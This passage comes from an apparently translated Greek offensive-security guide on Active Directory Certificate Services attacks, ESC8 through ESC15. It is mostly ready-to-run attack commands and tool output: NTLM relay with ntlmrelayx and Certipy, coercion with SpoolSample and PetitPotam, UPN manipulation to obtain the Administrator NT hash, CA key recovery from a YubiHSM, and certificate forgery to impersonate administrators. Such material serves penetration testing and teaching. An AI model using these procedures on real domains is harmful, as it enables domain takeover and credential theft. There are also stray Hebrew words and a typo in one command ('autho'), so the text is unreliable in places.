3. **Εκδώστε το request** (αν ο ρόλος σας διαθέτει επίσης δικαιώματα έγκρισης *Manage Certificates*) ή περιμένετε έναν operator να το εγκρίνει. Μόλις εκδοθεί, κατεβάστε το certificate:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. Το resulting certificate περιέχει πλέον το malicious issuance-policy OID και μπορεί να χρησιμοποιηθεί σε επόμενες attacks (π.χ. ESC13, domain escalation κ.λπ.).

> NOTE: Η ίδια attack μπορεί να εκτελεστεί με το Certipy ≥ 4.7 μέσω της εντολής `ca` και της παραμέτρου `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Explanation

> [!TIP]
> Σε περιβάλλοντα όπου είναι εγκατεστημένο το **AD CS**, αν υπάρχει ένα **web enrollment endpoint vulnerable** και έχει δημοσιευτεί τουλάχιστον ένα **certificate template** που επιτρέπει **domain computer enrollment και client authentication** (όπως το default **`Machine`** template), καθίσταται δυνατός ο **compromise οποιουδήποτε computer με ενεργή την spooler service από έναν attacker**!

Το AD CS υποστηρίζει αρκετές **HTTP-based enrollment methods**, οι οποίες διατίθενται μέσω πρόσθετων server roles που μπορούν να εγκαταστήσουν οι administrators. Αυτά τα interfaces για HTTP-based certificate enrollment είναι ευάλωτα σε **NTLM relay attacks**. Ένας attacker, από ένα **compromised machine, μπορεί να impersonate οποιοδήποτε AD account που authenticates μέσω inbound NTLM**. Ενώ impersonates το victim account, μπορεί να αποκτήσει πρόσβαση σε αυτά τα web interfaces για να **ζητήσει ένα client authentication certificate χρησιμοποιώντας τα `User` ή `Machine` certificate templates**.

- Το **web enrollment interface** (μια παλαιότερη ASP application διαθέσιμη στη διεύθυνση `http://<caserver>/certsrv/`) χρησιμοποιεί εξ ορισμού μόνο HTTP, το οποίο δεν παρέχει προστασία από NTLM relay attacks. Επιπλέον, επιτρέπει ρητά μόνο NTLM authentication μέσω του Authorization HTTP header, καθιστώντας μη εφαρμόσιμες πιο ασφαλείς μεθόδους authentication όπως το Kerberos.
- Το **Certificate Enrollment Service** (CES), το **Certificate Enrollment Policy** (CEP) Web Service και το **Network Device Enrollment Service** (NDES) υποστηρίζουν εξ ορισμού negotiate authentication μέσω του Authorization HTTP header. Το Negotiate authentication **υποστηρίζει τόσο Kerberos όσο και NTLM**, επιτρέποντας σε έναν attacker να κάνει **downgrade σε NTLM** authentication κατά τη διάρκεια relay attacks. Παρότι αυτά τα web services ενεργοποιούν εξ ορισμού το HTTPS, το HTTPS από μόνο του **δεν προστατεύει από NTLM relay attacks**. Η προστασία από NTLM relay attacks για HTTPS services είναι δυνατή μόνο όταν το HTTPS συνδυάζεται με channel binding. Δυστυχώς, το AD CS δεν ενεργοποιεί το Extended Protection for Authentication στο IIS, το οποίο απαιτείται για το channel binding.<sup>[[6]](#references)</sup>

Ένα συνηθισμένο **issue** με τα NTLM relay attacks είναι η **μικρή διάρκεια των NTLM sessions** και η αδυναμία του attacker να αλληλεπιδράσει με services που **απαιτούν NTLM signing**.

Ωστόσο, αυτός ο περιορισμός παρακάμπτεται με την εκμετάλλευση ενός NTLM relay attack για την απόκτηση certificate για τον user, καθώς η περίοδος ισχύος του certificate καθορίζει τη διάρκεια του session και το certificate μπορεί να χρησιμοποιηθεί με services που **επιβάλλουν NTLM signing**. Για οδηγίες σχετικά με τη χρήση ενός stolen certificate, ανατρέξτε στο:


{{#ref}}
account-persistence.md
{{#endref}}

Ένας ακόμη περιορισμός των NTLM relay attacks είναι ότι **ένα machine που ελέγχεται από τον attacker πρέπει να γίνει authenticated από ένα victim account**. Ο attacker μπορεί είτε να περιμένει είτε να προσπαθήσει να **force** αυτό το authentication:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

Το `cas` του [**Certify**](https://github.com/GhostPack/Certify) enumerates τα **enabled HTTP AD CS endpoints**:<sup>[[4]](#references)</sup>
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Η ιδιότητα `msPKI-Enrollment-Servers` χρησιμοποιείται από τις εταιρικές Certificate Authorities (CAs) για την αποθήκευση endpoints του Certificate Enrollment Service (CES). Αυτά τα endpoints μπορούν να αναλυθούν και να εμφανιστούν σε λίστα χρησιμοποιώντας το εργαλείο **Certutil.exe**:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Κατάχρηση με Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Κατάχρηση με [Certipy](https://github.com/ly4k/Certipy)

Το αίτημα για πιστοποιητικό υποβάλλεται από το Certipy, από προεπιλογή, με βάση το template `Machine` ή `User`, ανάλογα με το αν το όνομα του account που γίνεται relay τελειώνει σε `$`. Ο καθορισμός ενός εναλλακτικού template μπορεί να επιτευχθεί με τη χρήση της παραμέτρου `-template`.

Στη συνέχεια μπορεί να χρησιμοποιηθεί μια τεχνική όπως το [PetitPotam](https://github.com/ly4k/PetitPotam) για τον εξαναγκασμό του authentication. Όταν πρόκειται για domain controllers, απαιτείται ο καθορισμός του `-template DomainController`.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Επεξήγηση

Η νέα τιμή **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) για το **`msPKI-Enrollment-Flag`**, η οποία αναφέρεται ως ESC9, αποτρέπει την ενσωμάτωση της **νέας security extension `szOID_NTDS_CA_SECURITY_EXT`** σε ένα certificate. Αυτό το flag αποκτά σημασία όταν το `StrongCertificateBindingEnforcement` έχει οριστεί σε `1` (η προεπιλεγμένη ρύθμιση), σε αντίθεση με τη ρύθμιση `2`. Η σημασία του αυξάνεται σε σενάρια όπου θα μπορούσε να γίνει εκμετάλλευση ενός ασθενέστερου certificate mapping για Kerberos ή Schannel (όπως στο ESC10), καθώς η απουσία του ESC9 δεν θα άλλαζε τις απαιτήσεις.<sup>[[7]](#references)</sup>

Οι συνθήκες υπό τις οποίες η ρύθμιση αυτού του flag αποκτά σημασία περιλαμβάνουν:

- Το `StrongCertificateBindingEnforcement` δεν έχει οριστεί σε `2` (με προεπιλογή το `1`) ή το `CertificateMappingMethods` περιλαμβάνει το flag `UPN`.
- Το certificate έχει επισημανθεί με το flag `CT_FLAG_NO_SECURITY_EXTENSION` μέσα στη ρύθμιση `msPKI-Enrollment-Flag`.
- Το certificate καθορίζει οποιοδήποτε client authentication EKU.
- Υπάρχουν δικαιώματα `GenericWrite` σε οποιονδήποτε λογαριασμό, ώστε να γίνει compromise ενός άλλου.

### Σενάριο Abuse

Ας υποθέσουμε ότι ο `John@corp.local` διαθέτει δικαιώματα `GenericWrite` στον `Jane@corp.local`, με στόχο να γίνει compromise του `Administrator@corp.local`. Το certificate template `ESC9`, στο οποίο επιτρέπεται στη `Jane@corp.local` να κάνει enroll, έχει ρυθμιστεί με το flag `CT_FLAG_NO_SECURITY_EXTENSION` στη ρύθμιση `msPKI-Enrollment-Flag`.

Αρχικά, αποκτάται το hash της `Jane` μέσω Shadow Credentials, χάρη στο `GenericWrite` του `John`:
```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, παραλείποντας σκόπιμα το τμήμα domain `@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Η τροποποίηση αυτή δεν παραβιάζει τους περιορισμούς, καθώς το `Administrator@corp.local` παραμένει διακριτό ως το `userPrincipalName` του `Administrator`.

Στη συνέχεια, ζητείται ως `Jane` το πρότυπο πιστοποιητικού `ESC9`, το οποίο έχει επισημανθεί ως ευάλωτο:
```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```
Σημειώνεται ότι το `userPrincipalName` του certificate αντικατοπτρίζει τον `Administrator`, χωρίς κανένα “object SID”.

Στη συνέχεια, το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`:
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η προσπάθεια authentication με το εκδοθέν certificate επιστρέφει πλέον το NT hash του `Administrator@corp.local`. Η εντολή πρέπει να περιλαμβάνει `-domain <domain>` λόγω της απουσίας specification domain από το certificate:
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
## Αδύναμες Αντιστοιχίσεις Πιστοποιητικών - ESC10

### Επεξήγηση

Δύο τιμές κλειδιών registry στον domain controller αναφέρονται από το ESC10:

- Η προεπιλεγμένη τιμή για το `CertificateMappingMethods` תחת `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` είναι `0x18` (`0x8 | 0x10`), ενώ προηγουμένως είχε οριστεί σε `0x1F`.
- Η προεπιλεγμένη ρύθμιση για το `StrongCertificateBindingEnforcement` תחת `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` είναι `1`, ενώ προηγουμένως ήταν `0`.<sup>[[7]](#references)</sup>

**Περίπτωση 1**

Όταν το `StrongCertificateBindingEnforcement` έχει ρυθμιστεί σε `0`.

**Περίπτωση 2**

Αν το `CertificateMappingMethods` περιλαμβάνει το bit `UPN` (`0x4`).

### Περίπτωση Abuse 1

Με το `StrongCertificateBindingEnforcement` ρυθμισμένο σε `0`, ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να γίνει αντικείμενο εκμετάλλευσης για την παραβίαση οποιουδήποτε λογαριασμού B.

Για παράδειγμα, έχοντας δικαιώματα `GenericWrite` πάνω στο `Jane@corp.local`, ένας attacker στοχεύει να παραβιάσει το `Administrator@corp.local`. Η διαδικασία είναι αντίστοιχη με το ESC9, επιτρέποντας τη χρήση οποιουδήποτε certificate template.

Αρχικά, γίνεται ανάκτηση του hash της `Jane` μέσω των Shadow Credentials, με εκμετάλλευση του `GenericWrite`.
```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```
Στη συνέχεια, το `userPrincipalName` της `Jane` τροποποιείται σε `Administrator`, παραλείποντας σκόπιμα το τμήμα `@corp.local` για την αποφυγή παραβίασης περιορισμού.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```
Με βάση αυτό, ζητείται ένα πιστοποιητικό που επιτρέπει την ταυτοποίηση πελάτη ως `Jane`, χρησιμοποιώντας το προεπιλεγμένο `User` template.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` στη συνέχεια επαναφέρεται στην αρχική του τιμή, `Jane@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```
Η ταυτοποίηση με το αποκτηθέν certificate θα αποδώσει το NT hash του `Administrator@corp.local`, απαιτώντας τον καθορισμό του domain στην εντολή, επειδή το certificate δεν περιέχει πληροφορίες domain.
```bash
certipy auth -pfx administrator.pfx -domain corp.local
```
### Abuse Case 2

Με το `CertificateMappingMethods` να περιέχει το bit flag `UPN` (`0x4`), ένας λογαριασμός A με δικαιώματα `GenericWrite` μπορεί να παραβιάσει οποιονδήποτε λογαριασμό B που δεν διαθέτει ιδιότητα `userPrincipalName`, συμπεριλαμβανομένων των machine accounts και του ενσωματωμένου domain administrator `Administrator`.

Εδώ, ο στόχος είναι η παραβίαση του `DC$@corp.local`, ξεκινώντας με την απόκτηση του hash της `Jane` μέσω των Shadow Credentials και αξιοποιώντας το `GenericWrite`.
```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```
Το `userPrincipalName` της `Jane` στη συνέχεια ορίζεται σε `DC$@corp.local`.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```
Ζητείται certificate για client authentication ως `Jane` χρησιμοποιώντας το προεπιλεγμένο template `User`.
```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```
Το `userPrincipalName` της `Jane` επαναφέρεται στην αρχική του τιμή μετά από αυτήν τη διαδικασία.
```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```
Για την αυθεντικοποίηση μέσω Schannel, χρησιμοποιείται η επιλογή `-ldap-shell` του Certipy, υποδεικνύοντας επιτυχή αυθεντικοποίηση ως `u:CORP\DC$`.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Μέσω του LDAP shell, εντολές όπως η `set_rbcd` επιτρέπουν επιθέσεις Resource-Based Constrained Delegation (RBCD), θέτοντας δυνητικά σε κίνδυνο τον domain controller.
```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```
Αυτή η ευπάθεια επεκτείνεται επίσης σε οποιονδήποτε λογαριασμό χρήστη δεν διαθέτει `userPrincipalName` ή όπου αυτό δεν ταιριάζει με το `sAMAccountName`, με τον προεπιλεγμένο `Administrator@corp.local` να αποτελεί βασικό στόχο λόγω των αυξημένων LDAP privileges του και της απουσίας `userPrincipalName` από προεπιλογή.

## Relaying NTLM to ICPR - ESC11

### Explanation

Εάν ο CA Server δεν έχει ρυθμιστεί με `IF_ENFORCEENCRYPTICERTREQUEST`, μπορεί να πραγματοποιηθούν NTLM relay attacks χωρίς signing μέσω της RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Μπορείτε να χρησιμοποιήσετε το `certipy` για να ελέγξετε αν το `Enforce Encryption for Requests` είναι Disabled. Το certipy θα εμφανίσει τις `ESC11` Vulnerabilities.
```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
0
CA Name                             : DC01-CA
DNS Name                            : DC01.domain.local
Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
....
Enforce Encryption for Requests     : Disabled
....
[!] Vulnerabilities
ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```
### Σενάριο κατάχρησης

Χρειάζεται να ρυθμιστεί ένας relay server:
```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
Σημείωση: Για domain controllers, πρέπει να καθορίσουμε το `-template` στο DomainController.

Ή χρησιμοποιώντας το [fork του impacket από τον sploutchy](https://github.com/sploutchy/impacket):
```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```
## Shell access σε ADCS CA με YubiHSM - ESC12

### Explanation

Οι administrators μπορούν να ρυθμίσουν το Certificate Authority ώστε να αποθηκεύεται σε μια εξωτερική συσκευή, όπως το "Yubico YubiHSM2".

Αν μια USB device είναι συνδεδεμένη στον CA server μέσω USB port ή μέσω USB device server στην περίπτωση που ο CA server είναι virtual machine, απαιτείται ένα authentication key (μερικές φορές αναφέρεται ως "password") ώστε το Key Storage Provider να δημιουργεί και να χρησιμοποιεί keys στο YubiHSM.

Αυτό το key/password αποθηκεύεται στο registry, στη διαδρομή `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword`, σε cleartext.

Reference [εδώ](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Abuse Scenario

Αν το private key του CA είναι αποθηκευμένο σε μια physical USB device και αποκτήσετε shell access, είναι δυνατό να ανακτηθεί το key.

Αρχικά, πρέπει να αποκτήσετε το CA certificate (είναι public) και στη συνέχεια:
```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```
Τέλος, χρησιμοποιήστε την εντολή `certutil -sign` για να δημιουργήσετε ένα νέο αυθαίρετο certificate χρησιμοποιώντας το CA certificate και το private key του.

## OID Group Link Abuse - ESC13

### Επεξήγηση

Το attribute `msPKI-Certificate-Policy` επιτρέπει την προσθήκη της issuance policy στο certificate template. Τα objects `msPKI-Enterprise-Oid`, τα οποία είναι υπεύθυνα για την έκδοση policies, μπορούν να εντοπιστούν στο Configuration Naming Context (`CN=OID,CN=Public Key Services,CN=Services`) του PKI OID container. Μια policy μπορεί να συνδεθεί με ένα AD group μέσω του attribute `msDS-OIDToGroupLink` αυτού του object, επιτρέποντας σε ένα system να εξουσιοδοτήσει έναν user που παρουσιάζει το certificate σαν να ήταν μέλος του group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Με άλλα λόγια, όταν ένας user έχει permission να κάνει enroll σε ένα certificate και το certificate είναι συνδεδεμένο με ένα OID group, ο user μπορεί να κληρονομήσει τα privileges αυτού του group.

Χρησιμοποιήστε το [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) για να βρείτε το OIDToGroupLink:
```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```
### Σενάριο κατάχρησης

Βρείτε ένα permission χρήστη που μπορεί να χρησιμοποιηθεί με `certipy find` ή `Certify.exe find /showAllPermissions`.

Αν ο `John` έχει permission να κάνει enroll στο `VulnerableTemplate`, ο χρήστης μπορεί να κληρονομήσει τα privileges της ομάδας `VulnerableGroup`.

Το μόνο που χρειάζεται να κάνει είναι να καθορίσει το template· θα λάβει ένα certificate με δικαιώματα `OIDToGroupLink`.
```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
## Ευάλωτη διαμόρφωση ανανέωσης πιστοποιητικών - ESC14

### Επεξήγηση

Η περιγραφή στη διεύθυνση https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping είναι εξαιρετικά λεπτομερής. Παρακάτω παρατίθεται μετάφραση του αρχικού κειμένου.<sup>[[14]](#references)</sup>

Το ESC14 αφορά ευπάθειες που προκύπτουν από το "weak explicit certificate mapping", κυρίως μέσω της κακής χρήσης ή της μη ασφαλούς διαμόρφωσης του attribute `altSecurityIdentities` σε λογαριασμούς χρηστών ή υπολογιστών του Active Directory. Αυτό το multi-valued attribute επιτρέπει στους administrators να συσχετίζουν χειροκίνητα πιστοποιητικά X.509 με έναν λογαριασμό AD για σκοπούς authentication. Όταν συμπληρωθούν, αυτά τα explicit mappings μπορούν να παρακάμψουν την προεπιλεγμένη λογική certificate mapping, η οποία συνήθως βασίζεται σε UPNs ή DNS names στο SAN του πιστοποιητικού ή στο SID που είναι ενσωματωμένο στο security extension `szOID_NTDS_CA_SECURITY_EXT`.

Ένα mapping θεωρείται "weak" όταν η string value που χρησιμοποιείται μέσα στο attribute `altSecurityIdentities` για την αναγνώριση ενός πιστοποιητικού είναι υπερβολικά ευρεία, εύκολα προβλέψιμη, βασίζεται σε μη μοναδικά certificate fields ή χρησιμοποιεί components του πιστοποιητικού που μπορούν εύκολα να πλαστογραφηθούν. Αν ένας attacker μπορέσει να αποκτήσει ή να δημιουργήσει ένα πιστοποιητικό του οποίου τα attributes ταιριάζουν με ένα τέτοιο weakly defined explicit mapping για έναν privileged account, μπορεί να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως ο συγκεκριμένος λογαριασμός και για impersonation του.

Παραδείγματα δυνητικά weak `altSecurityIdentities` mapping strings περιλαμβάνουν:

- Mapping αποκλειστικά μέσω ενός κοινού Subject Common Name (CN): π.χ. `X509:<S>CN=SomeUser`. Ένας attacker μπορεί να μπορέσει να αποκτήσει ένα πιστοποιητικό με αυτό το CN από μια λιγότερο ασφαλή πηγή.
- Χρήση υπερβολικά generic Issuer Distinguished Names (DNs) ή Subject DNs χωρίς περαιτέρω qualification, όπως συγκεκριμένο serial number ή subject key identifier: π.χ. `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Χρήση άλλων predictable patterns ή non-cryptographic identifiers που ένας attacker μπορεί να είναι σε θέση να ικανοποιήσει σε ένα πιστοποιητικό το οποίο μπορεί να αποκτήσει νόμιμα ή να forge (αν έχει παραβιάσει ένα CA ή έχει εντοπίσει ένα vulnerable template όπως στο ESC1).

Το attribute `altSecurityIdentities` υποστηρίζει διάφορα formats για mapping, όπως:

- `X509:<I>IssuerDN<S>SubjectDN` (mapping μέσω πλήρους Issuer και Subject DN)
- `X509:<SKI>SubjectKeyIdentifier` (mapping μέσω της τιμής του Subject Key Identifier extension του πιστοποιητικού)
- `X509:<SR>SerialNumberBackedByIssuerDN` (mapping μέσω serial number, το οποίο implicitly qualified από το Issuer DN) - αυτό δεν είναι standard format, συνήθως είναι `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (mapping μέσω RFC822 name, συνήθως email address, από το SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (mapping μέσω SHA1 hash του raw public key του πιστοποιητικού - γενικά strong)

Η ασφάλεια αυτών των mappings εξαρτάται σε μεγάλο βαθμό από την specificity, τη μοναδικότητα και την cryptographic strength των certificate identifiers που επιλέγονται στο mapping string. Ακόμη και όταν είναι ενεργοποιημένα strong certificate binding modes στους Domain Controllers (τα οποία επηρεάζουν κυρίως τα implicit mappings που βασίζονται σε SAN UPNs/DNS και στο SID extension), ένα poorly configured entry στο `altSecurityIdentities` μπορεί και πάλι να αποτελέσει άμεση διαδρομή για impersonation, αν η ίδια η mapping logic είναι flawed ή υπερβολικά permissive.

### Σενάριο κατάχρησης

Το ESC14 στοχεύει τα **explicit certificate mappings** στο Active Directory (AD), και συγκεκριμένα το attribute `altSecurityIdentities`. Αν αυτό το attribute έχει οριστεί (είτε σκόπιμα είτε λόγω misconfiguration), οι attackers μπορούν να κάνουν impersonation λογαριασμών παρουσιάζοντας πιστοποιητικά που ταιριάζουν με το mapping.

#### Scenario A: Ο attacker μπορεί να γράψει στο `altSecurityIdentities`

**Precondition**: Ο attacker έχει write permissions στο attribute `altSecurityIdentities` του target account ή permission να του το εκχωρήσει μέσω μίας από τις ακόλουθες permissions στο target AD object:
- Write property `altSecurityIdentities`
- Write property `Public-Information`
- Write property (all)
- `WriteDACL`
- `WriteOwner`*
- `GenericWrite`
- `GenericAll`
- Owner*.
#### Scenario B: Το target έχει weak mapping μέσω X509RFC822 (Email)

- **Precondition**: Το target έχει weak X509RFC822 mapping στο altSecurityIdentities. Ένας attacker μπορεί να ορίσει το mail attribute του victim ώστε να ταιριάζει με το X509RFC822 name του target, να κάνει enroll ένα πιστοποιητικό ως ο victim και να το χρησιμοποιήσει για authentication ως το target.
#### Scenario C: Το target έχει X509IssuerSubject Mapping

- **Precondition**: Το target έχει weak X509IssuerSubject explicit mapping στο `altSecurityIdentities`.Ο attacker μπορεί να ορίσει το attribute `cn` ή `dNSHostName` σε έναν victim principal ώστε να ταιριάζει με το subject του X509IssuerSubject mapping του target. Έπειτα, ο attacker μπορεί να κάνει enroll ένα πιστοποιητικό ως ο victim και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως το target.
#### Scenario D: Το target έχει X509SubjectOnly Mapping

- **Precondition**: Το target έχει weak X509SubjectOnly explicit mapping στο `altSecurityIdentities`. Ο attacker μπορεί να ορίσει το attribute `cn` ή `dNSHostName` σε έναν victim principal ώστε να ταιριάζει με το subject του X509SubjectOnly mapping του target. Έπειτα, ο attacker μπορεί να κάνει enroll ένα πιστοποιητικό ως ο victim και να χρησιμοποιήσει αυτό το πιστοποιητικό για authentication ως το target.
### Συγκεκριμένες λειτουργίες
#### Scenario A

Κάντε request ενός πιστοποιητικού από το certificate template `Machine`
```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```
Αποθήκευση και μετατροπή του πιστοποιητικού
```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```
Κάντε authentication (χρησιμοποιώντας το certificate)
```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```
Προαιρετικός καθαρισμός
```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```
Για πιο συγκεκριμένες attack methods σε διάφορα attack scenarios, ανατρέξτε στα εξής: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Explanation

Η περιγραφή στη διεύθυνση https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc είναι εξαιρετικά αναλυτική. Παρακάτω παρατίθεται απόσπασμα από το αρχικό κείμενο.<sup>[[15]](#references)</sup>

Χρησιμοποιώντας τα ενσωματωμένα προεπιλεγμένα certificate templates έκδοσης 1, ένας attacker μπορεί να δημιουργήσει ένα CSR που περιλαμβάνει application policies, οι οποίες έχουν προτεραιότητα έναντι των ρυθμισμένων Extended Key Usage attributes που καθορίζονται στο template. Η μόνη απαίτηση είναι enrollment rights και μπορεί να χρησιμοποιηθεί για τη δημιουργία client authentication, certificate request agent και codesigning certificates χρησιμοποιώντας το **_WebServer_** template

### Abuse

Η [Certipy privilege-escalation documentation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) περιέχει πιο λεπτομερή παραδείγματα χρήσης.<sup>[[14]](#references)</sup>


Η εντολή `find` του Certipy μπορεί να βοηθήσει στον εντοπισμό V1 templates που ενδέχεται να είναι ευάλωτα στο ESC15, εάν η CA δεν έχει γίνει patch.
```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```
#### Σενάριο A: Άμεση Impersonation μέσω Schannel

**Βήμα 1: Ζητήστε ένα certificate, εισάγοντας το Application Policy "Client Authentication" και το UPN-στόχο.** Ο attacker `attacker@corp.local` στοχεύει το `administrator@corp.local` χρησιμοποιώντας το template "WebServer" V1 (το οποίο επιτρέπει subject που παρέχεται από τον enrollee).
```bash
certipy req \
-u 'attacker@corp.local' -p 'Passw0rd!' \
-dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
-ca 'CORP-CA' -template 'WebServer' \
-upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
-application-policies 'Client Authentication'
```
- `-template 'WebServer'`: Το ευάλωτο V1 template με "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Εισάγει το OID `1.3.6.1.5.5.7.3.2` στην επέκταση Application Policies του CSR.
- `-upn 'administrator@corp.local'`: Ορίζει το UPN στο SAN για impersonation.

